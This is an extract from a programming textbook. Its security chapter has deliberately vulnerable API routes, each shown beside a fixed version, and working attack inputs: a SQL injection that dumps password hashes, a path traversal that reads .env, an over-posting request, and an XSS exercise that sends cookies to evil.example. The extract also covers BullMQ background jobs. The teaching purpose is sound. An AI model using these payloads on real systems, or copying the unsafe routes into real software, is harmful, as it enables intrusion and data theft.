Security logging and alerting failuresAttacks that nobody noticesChapter 13
Mishandling of exceptional conditionsErrors that leak details or fail open9.6, and Chapter 3

Two principles run through all of it. Never trust input: anything from the client (body, query, headers, cookies, file names) may be written by an attacker. And defence in depth: each layer assumes the one before it might fail.

9.2 Injection

The search below builds its SQL with a template string. For an ordinary search it works perfectly, which is exactly why this bug survives code review:

src/routes/search.ts
export const searchRoutes: FastifyPluginAsyncZod = async (app) => {
  app.get(
    "/unsafe/products",
    { schema: { querystring: Query } },
    async (request) => {
      // DANGER: the input becomes part of the SQL text
      const sql = `SELECT name, price FROM products WHERE name = '${request.query.q}'`;
      return (await db.query(sql)).rows;
    },
  );

  app.get("/products", { schema: { querystring: Query } }, async (request) => {
    // the input travels separately, as $1: it is only ever a value
    const sql = "SELECT name, price FROM products WHERE name = $1";
    return (await db.query(sql, [request.query.q])).rows;
  });
};
Terminal
# An ordinary search
$ curl -s -G localhost:3000/unsafe/products --data-urlencode "q=Robot kit" | jq -c
[{"name":"Robot kit","price":45000}]
# The same search, with SQL in the input
$ curl -s -G localhost:3000/unsafe/products --data-urlencode "q=x' UNION SELECT email || ' ' || password_hash, 0 FROM users --" | jq -c '.[]'
{"name":"sara@example.com scrypt$32768$nNSMalEv_zb9$Kj18iYtLJHiZb","price":0}
{"name":"omar@example.com scrypt$32768$j84P2D9FMN8n$6kpcvb9TyJSt0","price":0}
# The same input, as a parameter
$ curl -s -G localhost:3000/products --data-urlencode "q=x' UNION SELECT email || ' ' || password_hash, 0 FROM users --" | jq -c
[]

The attacker’s input closed the quote, added a UNION that reads the users table, and commented out the rest with --. The database cannot tell which part of the text came from the programmer and which from the attacker, so it ran all of it, and the response contains every email and password hash. With a little more work the same hole reads any table, changes data, or worse.

The safe route sends the same input as a parameter: the SQL text, with $1, and the value travel to PostgreSQL separately, so the value can never become code. It simply searched for a product with that strange name, and found none. Kysely and every serious query builder or ORM do this for every value, which is one more reason to use them. The danger remains wherever text is pasted into SQL:

  • Raw SQL helpers (sql.raw in Kysely, query() with a template): use their parameter form, never string building.
  • Identifiers such as a column to sort by cannot be parameters. Check them against a fixed list: sort must be one of "name" or "price", as Chapter 3’s schemas did.
  • The same bug exists outside SQL: shell commands built from input (use execFile with an array of arguments, not exec with a string), NoSQL filters built from JSON the client sent, and HTML built from input (section 9.5).

9.3 Over-posting

A profile update that writes whatever fields arrive is convenient: add a column, and the route supports it at once. It also supports columns nobody meant to expose:

src/routes/users.ts
export const userRoutes: FastifyPluginAsyncZod = async (app) => {
  app.patch(
    "/unsafe/users/:id",
    { schema: { params: Id, body: z.record(z.string(), z.string()) } },
    async (request) => {
      // DANGER: every field the client sends is written, role included
      const fields = Object.keys(request.body);
      const set = fields.map((f, i) => `"${f}" = $${i + 2}`).join(", ");
      const values = [request.params.id, ...Object.values(request.body)];
      const sql = `UPDATE users SET ${set} WHERE id = $1 ${show}`;
      return (await db.query(sql, values)).rows[0];
    },
  );

  app.patch(
    "/users/:id",
    {
      schema: {
        params: Id,
        // only the fields a customer may change; any other key is refused
        body: z.strictObject({ name: z.string().trim().min(1).max(100) }),
      },
    },
    async (request) => {
      const sql = `UPDATE users SET name = $2 WHERE id = $1 ${show}`;
      return (await db.query(sql, [request.params.id, request.body.name])).rows[0];
    },
  );
};
Terminal
# Omar changes his name, and his role
$ curl -s -X PATCH localhost:3000/unsafe/users/2 -H 'content-type: application/json' -d '{"name":"Omar","role":"admin"}' | jq -c
{"id":2,"name":"Omar","role":"admin"}
# The same request, on the safe route
$ curl -s -X PATCH localhost:3000/users/2 -H 'content-type: application/json' -d '{"name":"Omar","role":"admin"}' | jq -c
{"title":"Invalid body","status":422}

Omar sent one extra field and became an admin. This is over-posting (or mass assignment), a form of broken access control. The unsafe route has a second hole: it pastes the client’s field names into the SQL, so a key like role" = 'admin', "name would be injection again. The fix is the same as in every chapter so far: a strict schema that lists exactly what this route accepts. z.strictObject refuses unknown keys instead of ignoring them, so a client that sends role learns it is not allowed rather than wondering why nothing happened. Changing a role is a different route, for admins only.

9.4 Paths and other dangerous places

Serving files from a folder by name looks harmless. But a name is input, and .. means “the folder above”:

src/routes/files.ts
export const fileRoutes: FastifyPluginAsync = async (app) => {
  app.get<{ Params: { "*": string } }>(
    "/unsafe/files/*",
    async (request, reply) => {
      // DANGER: '../' climbs out of the folder
      const file = path.join(folder, request.params["*"]);
      return reply.type("text/plain").send(await readFile(file, "utf8"));
    },
  );

  app.get<{ Params: { "*": string } }>("/files/*", async (request, reply) => {
    // resolve the full path, then check it is still inside the folder
    const file = path.resolve(folder, request.params["*"]);
    if (!file.startsWith(folder + path.sep)) return reply.callNotFound();
    return reply.type("text/plain").send(await readFile(file, "utf8"));
  });
};
Terminal
# A public file
$ curl -s localhost:3000/unsafe/files/terms.txt
Terms of sale: prices include VAT; returns within 14 days.
# Climbing out of the folder
$ curl -s --path-as-is localhost:3000/unsafe/files/../.env
DATABASE_URL=postgres://bit:secret@localhost:5432/shop
ALLOWED_ORIGIN=https://shop.example
# The same path, on the safe route
$ curl -s --path-as-is localhost:3000/files/../.env | jq -c
{"title":"Not found","status":404}

This is path traversal, and here it handed over the .env file with the database password. The safe route resolves the full path and checks that it is still inside the public folder before reading. Even better is not to use the client’s text as a path at all: store files under random names, keep the original name in the database, and look up by id.

The same idea applies to every place where input reaches something powerful:

  • URLs the server fetches (“import a product image from this address”). An attacker gives http://localhost:5432 or the cloud provider’s internal metadata address, and your server, inside your network, fetches it for them. This is server-side request forgery (SSRF), exercise 5.
  • Redirects (?next=… after sign-in): only allow paths on your own site, or an attacker sends users to a fake copy of it.
  • Regular expressions built from input, or slow ones run on long input, can freeze the event loop for seconds.

Watch out: validation is not escaping

Validating input (“the name is 1 to 100 characters”) and making it safe for a destination (SQL, a path, HTML, a shell) are different jobs. A perfectly valid product name can contain a quote, .. or <script>. Validate at the edge, and make values safe where they are used, with the tool made for that destination: parameters, path checks, the template’s escaping.

9.5 Protecting browser users

An API is often called from a website, and the browser adds attacks of its own. Three are worth knowing by name:

  • Cross-site scripting (XSS): an attacker gets their script into a page other people see, for example as a product review, and it runs with the visitor’s session. An API protects itself by returning JSON with the right Content-Type, never HTML built from input; the frontend protects itself by escaping, which Vue and React do by default everywhere except v-html and dangerouslySetInnerHTML.
  • Clickjacking: your page is loaded invisibly inside another site, and the user is tricked into clicking your buttons.
  • Cross-site request forgery (CSRF): another site makes the browser send a request to yours, and the browser attaches your cookies. Cookies with SameSite=Lax (or Strict) are not sent with such requests; tokens in the Authorization header, as in Chapter 8, are never sent automatically at all.

Browsers can refuse much of this if the server asks them to, with security headers. The @fastify/helmet plugin sets a sensible set on every response:

src/app.ts
export async function buildApp() {
  // bodies above 100 KB are refused before they are read
  const app = Fastify({ bodyLimit: 100 * 1024 });
  app.setValidatorCompiler(validatorCompiler);
  app.setSerializerCompiler(serializerCompiler);

  // security headers on every response
  await app.register(helmet);
  // browsers may call this API only from the shop's own website
  await app.register(cors, {
    origin: [config.ALLOWED_ORIGIN],
    methods: ["GET", "PATCH"],
  });
Terminal
# The headers of every response
$ curl -s -I localhost:3000/files/terms.txt
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
vary: Origin
content-type: text/plain
  • Content-Security-Policy lists where scripts, styles and images may come from; an injected script from elsewhere, or inline, is refused. It is the strongest defence against XSS in pages.
  • Strict-Transport-Security tells the browser to use only HTTPS for this site for a year, so nobody can downgrade a visit to plain HTTP.
  • X-Frame-Options and frame-ancestors stop other sites from framing yours; X-Content-Type-Options: nosniff stops the browser from guessing that a text file is a script.

CORS (cross-origin resource sharing) is the other half. By default a script on evil.example may send a request to your API but may not read the answer. CORS headers relax that for the origins you name, and only for them:

Terminal
# A request from the shop's website
$ curl -s -I localhost:3000/files/terms.txt -H 'Origin: https://shop.example' | grep -i '^HTTP\|^access-control\|^vary'
HTTP/1.1 200 OK
vary: Origin
access-control-allow-origin: https://shop.example
# A request from another website
$ curl -s -I localhost:3000/files/terms.txt -H 'Origin: https://evil.example' | grep -i '^HTTP\|^access-control\|^vary'
HTTP/1.1 200 OK
vary: Origin

The shop’s website got Access-Control-Allow-Origin; the other website did not, so a browser will hide the response from its script. Note what CORS is not: it does not stop curl, scripts or servers, which ignore it, and it does not stop the request from reaching your server. It protects users’ browsers, not your API; authentication and authorization still do that. Never answer every origin with * on an API that uses cookies.

Quick check

  1. Why does a parameter stop SQL injection when escaping quotes by hand often fails?
  2. The safe users route uses z.strictObject. What would a plain z.object do with an extra role field?
  3. A request from evil.example reached the server in the CORS example. Why is that not a problem?

The answers are at the end of the chapter, after the summary.

9.6 Limits

An attacker does not need to break in to hurt you; making the server too busy for real users is enough. Every input needs a size:

Terminal
# A body of 200 KB
$ head -c 200000 /dev/zero | tr '\0' 'a' | sed 's/.*/{"name":"&"}/' | curl -s -X PATCH localhost:3000/users/2 -H 'content-type: application/json' --data-binary @- | jq -c
{"title":"Body too large","status":413}

The body limit refused 200 KB before parsing it. The same thinking applies everywhere: a maximum length on every string in every schema (the search accepts 100 characters), a maximum page size on every list, a rate limit on expensive routes (Chapter 3), timeouts on calls to other services, and a limit on upload sizes. Errors must not help the attacker either: the error handler logs the details and sends the client only a title and a status, never a stack trace or a SQL message.

9.7 Secrets and configuration

The .env file that path traversal leaked holds the most valuable things the application has: database passwords, API keys, signing secrets. Rules for them:

  • Never in the repository. .env is in .gitignore from the first commit; a file .env.example with every name and no real value documents what is needed. A secret pushed once is in the history forever: change it, do not just delete the file.
  • Different in every environment, set by the platform (Chapter 16’s containers receive them as environment variables) or by a secret manager, and changed when someone leaves the team.
  • Never logged. Log requests without their Authorization header and bodies without passwords.
  • Checked at start-up. A server that starts with a wrong setting fails later, at the worst moment and with a confusing error:
src/config.ts
import { z } from "zod";

// checked once, at start-up: a missing or wrong setting stops the server at once
const Config = z.object({
  DATABASE_URL: z.url(),
  ALLOWED_ORIGIN: z.url(),
  PORT: z.coerce.number().int().default(3000),
});

const parsed = Config.safeParse(process.env);
if (!parsed.success) {
  console.error("Invalid configuration:");
  for (const issue of parsed.error.issues) {
    console.error(`  ${issue.path.join(".")}: ${issue.message}`);
  }
  process.exit(1);
}
export const config = parsed.data;
Terminal
# A wrong setting at start-up
$ ALLOWED_ORIGIN=shop node --env-file=.env src/server.ts
Invalid configuration:
  ALLOWED_ORIGIN: Invalid URL

The rest of the code imports config instead of reading process.env, so every setting has a type, a check and one place where it is documented.

9.8 Dependencies

The shop’s code is a few hundred lines; the packages in node_modules are hundreds of thousands. Most attacks on a modern application could arrive through them: a known vulnerability in an old version, or a malicious package, a typo away from a popular one (expresss), or an honest package whose maintainer’s account was stolen. Habits that keep the risk small:

Terminal
# Known vulnerabilities in the dependencies
$ npm audit
found 0 vulnerabilities
  • npm audit checks every installed version against a database of known vulnerabilities; run it in CI, and fail the build on high and critical findings.
  • Commit the lockfile and install with npm ci, so every machine gets exactly the versions you tested.
  • Let a bot (Dependabot, Renovate) open pull requests for updates, so they arrive small and often, with tests, instead of once a year in a panic.
  • Before adding a package, look at who maintains it, how many people use it, and whether a few lines of your own would do. Every dependency is code you run with your server’s full permissions.

Professional habit: a security checklist in every review

Keep a short checklist next to your pull request template: Is every input validated with a size? Does any input reach SQL, a path, a URL, a shell or HTML? Is every new route behind authentication and authorization, with a test for the “no”? Are there new secrets, and are they outside the code? Are new dependencies needed and maintained? Thirty seconds per review prevents most of this chapter.

Common mistakes

MistakeWhat happensFix
SQL built with template stringsAttackers read or change any tableParameters; an allowlist for identifiers
Writing every field the client sendsCustomers make themselves adminsStrict schemas listing the allowed fields
User input in file pathsSecrets and source code read from diskResolve and check, or random names and ids
Fetching URLs the client choseThe server attacks your own networkAllowlists of hosts, no internal addresses
HTML built from inputScripts run in other users’ browsersJSON APIs, escaping, a Content Security Policy
Access-Control-Allow-Origin: * with cookiesAny site acts as the userAn allowlist of origins
No size limitsOne request ties up the serverBody limits, string lengths, page sizes
Secrets in the repository or the logsAnyone with the code has the keys.gitignore, environment variables, rotation
Never updating dependenciesKnown holes stay open for yearsnpm audit in CI, small regular updates

Summary

  • Never trust input, and defend in depth; the OWASP Top 10 is the map of what goes wrong most.
  • Injection happens when input becomes code: SQL takes parameters, identifiers take an allowlist.
  • Strict schemas stop over-posting; checked paths stop traversal; allowlists stop SSRF and open redirects.
  • Browsers are protected by security headers (CSP, HSTS, framing), CORS for named origins, and SameSite cookies.
  • Every input has a size, and errors reveal nothing.
  • Secrets live outside the code and the logs; configuration is checked at start-up; dependencies are audited and updated often.

Quick check answers: 1. With a parameter, the SQL text and the value are sent separately, so the database never parses the value as SQL, whatever characters it contains. Escaping by hand tries to make the value harmless inside the text, and must anticipate every special character, encoding and database quirk; missing one is enough. 2. It would accept the body and silently drop role, so Omar would not become an admin, but he would also not be told that the field is not allowed, and a later change to the code might start using it. strictObject refuses the request with 422. 3. CORS is not meant to stop requests; it stops a browser from letting a script on another site read the response. The server still checks who is calling and what they may do; and the request here changed nothing.

Practice projects

Each project hardens the shop’s API. For every defence, write a test or a script that shows the attack failing.

Project 9.1 · Easy

Harden the shop’s API

Apply this chapter’s defences to the API from Chapter 3.

You will practise: helmet, CORS, body limits, configuration checks and tests for them.

  1. Add @fastify/helmet, CORS for one origin read from the configuration, and a body limit.
  2. Move every process.env read into a checked config.ts, and add .env.example.
  3. Write tests that check the headers, that an unknown origin gets no CORS header, and that a big body gets 413.

Hint: app.inject returns the headers too, so these tests need no running server.

Project 9.2 · Medium

Attack your own code

Review the code of the previous chapters as an attacker, and fix what you find.

You will practise: code review for security, writing exploits as tests, and fixing them.

  1. List every input of the API (body fields, query parameters, path parameters, headers) and where each one ends up.
  2. For each, try the attacks of this chapter: injection, over-posting, huge values, unexpected types.
  3. For every real problem, first write a test that shows the attack working, then fix it and watch the test change.
  4. Write a short report: what you tried, what you found, what you changed.

Hint: look hard at sorting and filtering parameters, and at anything that builds SQL text, even inside Kysely.

Project 9.3 · Challenge

Safe product images

Let admins upload product images without opening a single hole.

You will practise: multipart uploads, checking file contents, random names, and serving files safely.

  1. Accept an upload with @fastify/multipart, at most 2 MB, admins only.
  2. Check the first bytes of the file (the “magic number”) to confirm it is a PNG or JPEG, whatever its name and Content-Type claim.
  3. Store it outside the code folder under a random name, and keep the original name and the product id in the database.
  4. Serve it by id with Content-Type from your own check, X-Content-Type-Options: nosniff, and Content-Disposition.

Hint: an “image” that is really HTML with a script, served from your domain with a guessed type, is stored XSS. Never trust the file name or the type the client sent.

Exercises

  1. Easy A list route takes ?sort=price and runs db.query("SELECT * FROM products ORDER BY " + sort). Why can’t a $1 parameter fix it, and what does?
  2. Easy A colleague says: “We don’t need authentication on this route, CORS only allows our website.” What is wrong with that?
  3. Medium Before a PATCH with a JSON body from the shop’s website, the browser sends a preflight request. Send the same request with curl, and explain each header of the answer.
  4. Medium The admin page of the shop shows product names with v-html, and someone creates a product named <img src=x onerror="fetch('//evil.example/?c='+document.cookie)">. What happens when an admin opens the page, and which defences of this chapter each stop it?
  5. Challenge A new route imports a product image from a URL the admin types. List three ways an attacker could abuse it, and the checks that stop each.

Answers to the exercises are at the end of the book and in the book’s code repository.

Coming up in Chapter 10

Some work should not happen while the customer waits: emails, reports, image resizing. Background jobs and queues: doing work later, retrying it safely, and never losing it.

10

Chapter 10

Background Jobs and Queues

In this chapter you will learn to

  • decide which work belongs in a request and which belongs in a background job
  • queue jobs with BullMQ and Redis, and run them in a separate worker process
  • retry failed jobs with growing pauses, and stop retrying when it is pointless
  • make jobs safe to run twice, and stop the same job from being queued twice
  • schedule work for fixed times, and shut workers down without losing jobs
  • keep queues and the database consistent with each other

When a customer places an order, the shop has more to do than save it: send a confirmation email, notify the warehouse, update a sales report, maybe resize the photos of a review. If the request does all of that, the customer waits for the slowest service in the chain, and when the mail provider has a bad minute, the order fails even though the order itself was fine. The answer is to do only the essential part in the request, write down the rest as jobs, and let separate processes do them a moment later. This chapter builds that with BullMQ on the Redis from Chapter 7, and runs every part of it for real.

Bit

Our first shop sent its emails inside the order request. One Friday evening the mail provider slowed to ten seconds per email, and our checkout took ten seconds too. Customers pressed “pay” again, and some were charged twice. Moving the emails into a queue took an afternoon; it would have saved us that whole weekend.

10.1 What belongs in a job

A request should do what the response depends on, and nothing more. Everything else is a candidate for a job:

  • Slow work: sending email and push notifications, generating PDFs and reports, resizing images, calling slow partner APIs.
  • Unreliable work: anything that talks to another service, which will sometimes be down and needs retries.
  • Work at a later time: “remind the customer in 24 hours if the basket is still full”, “the daily sales report at 6 in the morning”.
  • Heavy work: imports and exports of thousands of rows, which would block a web process for minutes.

A queue connects the two sides. The web process is the producer: it adds a job (a name and some data) to the queue and answers at once. A worker is a separate process that takes jobs from the queue and does them. Redis keeps the queue, so jobs survive a restart of either side, and you can run as many workers as the work needs.

10.2 A queue and a worker

BullMQ is the most widely used job queue for Node. A Queue object adds jobs, a Worker processes them, and both talk to Redis through an ioredis connection. The queue for order confirmations, with the options every job gets:

src/queue.ts
import { Queue } from "bullmq";
import { Redis } from "ioredis";

// one connection setting for the queue and the worker
export const connection = new Redis("redis://localhost:6379", {
  maxRetriesPerRequest: null,
});

export type Confirmation = { orderId: number; email: string };

export const mail = new Queue<Confirmation>("mail", {
  connection,
  // what every confirmation job gets unless it says otherwise
  defaultJobOptions: {
    // up to 3 attempts, waiting 1, then 2 seconds between them
    attempts: 3,
    backoff: { type: "exponential", delay: 1000 },
    // finished jobs are kept for an hour (to look at), failed ones for a week
    removeOnComplete: { age: 3600 },
    removeOnFail: { age: 7 * 24 * 3600 },
  },
});

export function queueConfirmation(orderId: number, email: string) {
  // the job id is the order id: queuing the same order twice keeps one job
  return mail.add(
    "confirmation",
    { orderId, email },
    { jobId: `order-${orderId}` },
  );
}

The order route would call queueConfirmation after saving the order. Here a small script plays the shop, queuing four confirmations and one of them twice:

demos/enqueue.ts
import { connection, mail, queueConfirmation } from "../src/queue.ts";

const orders = [
  [1001, "sara@example.com"],
  [1002, "omar@example.com"],
  [1003, "lina@example.com"],
  [1004, "karim-at-example.com"],
] as const;

for (const [orderId, email] of orders) {
  const start = performance.now();
  const job = await queueConfirmation(orderId, email);
  const ms = (performance.now() - start).toFixed(1);
  console.log(`job ${job.id} queued in ${ms} ms`);
}
const again = await queueConfirmation(1001, "sara@example.com");
console.log(`job ${again.id} queued again; jobs waiting: ${await mail.count()}`);
await mail.close();
await connection.quit();
Terminal
# The shop queues four confirmations (and one twice)
$ node demos/enqueue.ts
job order-1001 queued in 20.1 ms
job order-1002 queued in 0.8 ms
job order-1003 queued in 0.8 ms
job order-1004 queued in 0.9 ms
job order-1001 queued again; jobs waiting: 4
# Nobody is working yet: the jobs wait in Redis
$ redis-cli LLEN bull:mail:wait
(integer) 4

Queuing took about a millisecond (the first job paid for opening the connection), so the order request stays fast whatever the mail service is doing. Order 1001 was queued twice but there are four jobs, not five: the job id order-1001 already existed, so BullMQ kept the first one. And no worker is running yet, so the four jobs simply wait in Redis.

The worker is its own program, started with npm run worker, usually on more than one machine. For each job it calls the function you give it; when the function returns, the job is done, and when it throws, the job has failed:

src/worker.ts
const worker = new Worker<Confirmation>(
  "mail",
  // the work itself: called once per job, maybe again if it fails
  async (job) => {
    const { orderId, email } = job.data;
    console.log(
      `${at()} sending the confirmation for order ${orderId} (attempt ${job.attemptsMade + 1})`,
    );
    await sendMail(orderId, email);
  },
  // at most two jobs at the same time in this process
  { connection, concurrency: 2 },
);

worker.on("completed", (job) => console.log(`${at()} ${job.id} sent`));
worker.on("failed", (job, error) => {
  const final = job && job.attemptsMade >= (job.opts.attempts ?? 1);
  console.log(`${at()} ${job?.id} failed: ${error.message}`);
  if (final || error.name === "UnrecoverableError") {
    console.log(`${at()} ${job?.id} gave up; attempts made: ${job?.attemptsMade}`);
  }
});

The “mail service” is a stand-in with bad days built in: order 1003 fails twice before it works, and order 1004 has an address that can never work:

src/mailer.ts
export async function sendMail(orderId: number, email: string) {
  await new Promise((resolve) => setTimeout(resolve, 300));
  const n = (attempts.get(orderId) ?? 0) + 1;
  attempts.set(orderId, n);
  // a mail service that fails the first two times for order 1003
  if (orderId === 1003 && n <= 2) throw new Error("mail service unavailable");
  // an address that can never work: no point trying forever
  if (!email.includes("@"))
    throw new UnrecoverableError(`invalid address: ${email}`);
}
Terminal
# A worker starts and does them
$ node src/worker.ts --until-empty
 0.0s sending the confirmation for order 1001 (attempt 1)
 0.0s sending the confirmation for order 1002 (attempt 1)
 0.3s order-1001 sent
 0.3s sending the confirmation for order 1003 (attempt 1)
 0.3s order-1002 sent
 0.3s sending the confirmation for order 1004 (attempt 1)
 0.6s order-1003 failed: mail service unavailable
 0.6s order-1004 failed: invalid address: karim-at-example.com
 0.6s order-1004 gave up; attempts made: 1
 1.7s sending the confirmation for order 1003 (attempt 2)
 2.0s order-1003 failed: mail service unavailable
 4.0s sending the confirmation for order 1003 (attempt 3)
 4.3s order-1003 sent

Read the times on the left. Two jobs ran at once (concurrency: 2), and orders 1001 and 1002 were sent in 0.3 seconds. Order 1003 failed, waited about a second, failed again, waited about two seconds, and was sent on its third attempt, without anyone doing anything. Order 1004 failed once and was given up at once.

10.3 Retries and failures

Retrying is what makes jobs reliable, and BullMQ’s options decide how:

  • attempts: 3 allows three tries in total.
  • backoff: exponential with delay: 1000 waits 1, 2, 4… seconds between tries. Growing pauses give a struggling service time to recover, instead of hitting it again at once with every queued job. (In real systems, add jitter, a little randomness, so that a thousand jobs that failed together do not all retry in the same second.)
  • Some errors will never go away: an invalid address, an order that no longer exists. Throwing BullMQ’s UnrecoverableError skips the remaining attempts, as order 1004 shows.

A job that runs out of attempts is not lost. It moves to the failed list with its reason, and stays there (for a week, by removeOnFail) until someone looks:

demos/failed.ts
for (const job of await mail.getFailed()) {
  console.log(job.id, job.attemptsMade, job.failedReason);
}
await mail.close();
await connection.quit();
Terminal
# What is left in the failed list
$ node demos/failed.ts
order-1004 1 invalid address: karim-at-example.com

In production, failed jobs are a signal: count them on a dashboard and alert when they grow (Chapter 13). After the cause is fixed, they can be retried (exercise 4). Some teams call this list a dead-letter queue.

Watch out: a job can run twice

Queues promise that a job runs at least once, not exactly once. A worker can crash after sending the email but before telling Redis the job is done; the job then runs again on another worker. Every job must be idempotent: running it twice has the same effect as running it once. Check before acting (“is the confirmation for order 1001 already marked as sent?”), give the mail provider an idempotency key such as order-1001-confirmation, and make database changes with conditions, as in Chapter 6.

10.4 Jobs and the database

The order is saved in PostgreSQL and the job in Redis, and the two cannot share a transaction. Two orders of steps are possible, and both have a gap:

  • Queue, then commit: if the transaction then rolls back, the worker may already be sending a confirmation for an order that does not exist. Worse, the worker may run before the commit and not find the order.
  • Commit, then queue: if the process dies between the two, the order exists and its confirmation is never sent.

The second is usually acceptable for emails and easy to repair with a periodic check (“orders older than ten minutes without a sent confirmation”). When it is not, use the outbox from Chapter 6: insert the message into an outbox table in the same transaction as the order, and let a small relay process move outbox rows into the queue. Both the order and its job then exist, or neither does. Two more habits keep jobs and data in step:

  • Put ids in jobs, not data. The job carries orderId, and the worker reads the order from the database when it runs. Data copied into the job may be out of date by then.
  • Keep job data small and free of secrets: it is stored in Redis, visible in dashboards, and kept after the job finishes.

Quick check

  1. Why did order 1001 end up as one job when it was queued twice?
  2. What is the difference between an ordinary error and UnrecoverableError in a job?
  3. Why should a job carry the order id rather than a copy of the order?

The answers are at the end of the chapter, after the summary.

10.5 Scheduled work

Some jobs are not caused by a request but by the clock. A job scheduler creates a job at every time that matches a cron pattern; here a sales report every morning at six, Cairo time:

demos/schedule.ts
const reports = new Queue("reports", { connection });
// a job scheduler: BullMQ creates the job at every matching time
await reports.upsertJobScheduler(
  "daily-sales",
  { pattern: "0 6 * * *", tz: "Africa/Cairo" },
  { name: "sales-report", data: { period: "yesterday" } },
);
for (const s of await reports.getJobSchedulers()) {
  console.log(
    s.key,
    s.pattern,
    s.tz,
    "next run:",
    new Date(s.next ?? 0).toISOString(),
  );
}
await reports.close();
await connection.quit();
Terminal
# A report every morning at 6, Cairo time
$ node demos/schedule.ts
daily-sales 0 6 * * * Africa/Cairo next run: 2026-11-21T04:00:00.000Z

The pattern 0 6 * * * reads “minute 0, hour 6, every day of every month, every weekday”. The next run, 04:00 UTC, is six in the morning in Cairo: always give a time zone, or the report moves by an hour twice a year. Because the scheduler lives in Redis, it fires once however many workers are running, which a setInterval in each server could never promise. upsertJobScheduler creates it or updates it, so it can run safely at every start.

10.6 Running workers in production

Workers are long-running processes, and they need the same care as web servers:

src/worker.ts
for (const signal of ["SIGINT", "SIGTERM"]) {
  process.once(signal, async () => {
    await Promise.all([worker.close(), mail.close()]);
    await connection.quit();
  });
}
  • Graceful shutdown. A deploy stops the old worker with SIGTERM. worker.close() stops taking new jobs and waits for the jobs in hand to finish, so nothing is cut in half. Give it enough time before the platform kills the process.
  • Separate processes, separate scaling. Web servers scale with traffic, workers with the amount of queued work. Chapter 16 runs them as separate containers from the same image.
  • Different queues for different work. A queue of slow PDF exports should not delay password-reset emails. Give urgent work its own queue and its own workers, or at least priorities.
  • Redis configured for queues. Unlike a cache, a queue must not lose data: persistence on, and maxmemory-policy noeviction, as Chapter 7 explained.
  • Visibility. Watch the number of waiting, delayed and failed jobs, and how long jobs wait before they start. A queue that grows all day means the workers cannot keep up.

Professional habit: design every job to be retried

When you write a job, ask three questions before the code: What happens if it runs twice? What happens if it fails halfway? What happens if it runs an hour late? Write the answers as a comment above the processor, and make the code match them. Jobs that survive these three questions survive production.

Common mistakes

MistakeWhat happensFix
Slow or unreliable work inside the requestSlow checkouts, failures from other servicesQueue it; answer at once
Jobs that are not idempotentDouble emails, double charges after a retryCheck first, idempotency keys, conditional updates
Retrying at once, foreverA struggling service is hammered; jobs never endLimited attempts, exponential backoff with jitter
Retrying errors that can never succeedWasted work, noisy failuresUnrecoverableError
Queuing before the database commitsJobs for data that does not existQueue after the commit, or an outbox
Whole records copied into jobsWorkers act on stale dataIds in jobs; read the data when running
Killing workers without waitingJobs cut in half at every deployworker.close() on SIGTERM
setInterval on every server for scheduled workThe report runs once per serverA job scheduler in the queue
Nobody looks at failed jobsSilent lossesCount them, alert, retry after fixing

Summary

  • A request does what its response needs; slow, unreliable or later work becomes a job in a queue.
  • BullMQ keeps queues in Redis; producers add jobs in a millisecond, workers in separate processes do them.
  • Attempts with exponential backoff make jobs reliable; UnrecoverableError stops pointless retries; failed jobs wait to be looked at.
  • Jobs run at least once: make them idempotent, and use job ids so that the same work is queued once.
  • Queue after the commit or through an outbox; put ids in jobs, not copies of data.
  • Job schedulers run timed work once across all workers; workers shut down gracefully and are watched like servers.

Quick check answers: 1. queueConfirmation gives every job the id order- plus the order number, and BullMQ does not add a job whose id already exists in the queue, so the second call returned the existing job. 2. After an ordinary error the job is retried, up to attempts, with the backoff between tries; after an UnrecoverableError it goes straight to the failed list, because retrying cannot help. 3. The job may run seconds or hours later, and more than once; reading the order when the job runs gives the current data (it may have been cancelled or changed), and keeps the job small and free of personal details.

Practice projects

Each project moves real work of the shop into the background. For each, show what happens when the work fails.

Project 10.1 · Easy

Confirmations from the order route

Queue a confirmation from the real order route of Chapter 3, and send it from a worker.

You will practise: producers in routes, workers reading from the database, and idempotent jobs.

  1. After the order is saved and committed, call queueConfirmation(order.id), with only the id in the job.
  2. In the worker, read the order and its items from the database, and “send” the email by writing it to a file.
  3. Add a confirmation_sent_at column; the worker skips orders that already have one and sets it after sending.
  4. Kill the worker in the middle of a job, start it again, and show that no email is sent twice.

Hint: set confirmation_sent_at with a conditional update (WHERE confirmation_sent_at IS NULL) and check the number of rows changed, as in Chapter 6.

Project 10.2 · Medium

Abandoned basket reminders

Remind customers about a full basket 24 hours later, unless they have ordered in the meantime.

You will practise: delayed jobs, cancelling jobs, and checking the current state when a job runs.

  1. When a basket changes, add a job with delay: 24 * 3600 * 1000 and the job id basket-{customerId}, replacing any earlier one.
  2. When the customer orders, remove the job.
  3. In the worker, check again that the basket is still full and no order was placed, before sending anything.
  4. Test it with a delay of a few seconds instead of a day.

Hint: removing the job is an optimisation; the check in the worker is what makes it correct, because the order and the removal can race.

Project 10.3 · Challenge

An outbox relay

Guarantee that every committed order gets its confirmation job, even if the process dies right after the commit.

You will practise: the outbox pattern, FOR UPDATE SKIP LOCKED, and at-least-once delivery from end to end.

  1. In the order transaction, insert a row into outbox (type, payload, created) instead of queuing.
  2. Write a relay that, every second, takes up to 100 unsent rows with FOR UPDATE SKIP LOCKED, queues each with the job id taken from the outbox row, and marks them sent.
  3. Run two relays at once, and show that each row is queued once.
  4. Kill a relay after queuing but before marking rows sent, and show that the job ids stop the duplicates.

Hint: the outbox row id makes a perfect job id: if the relay queues the same row twice, BullMQ keeps one job.

Exercises

  1. Easy For each, say whether it belongs in the request or in a job, and why: checking stock before accepting an order; sending the order confirmation; charging the card; generating the monthly invoice PDF.
  2. Easy With attempts: 5 and exponential backoff from 1 second, how long after the first failure does the last attempt start, at the earliest?
  3. Medium A worker sends the email and then crashes before the job is marked done. What happens next, and what must the job do so that the customer gets one email?
  4. Medium The address of order 1004 has been corrected. Write a script that retries the failed jobs with the corrected data, and run the worker again.
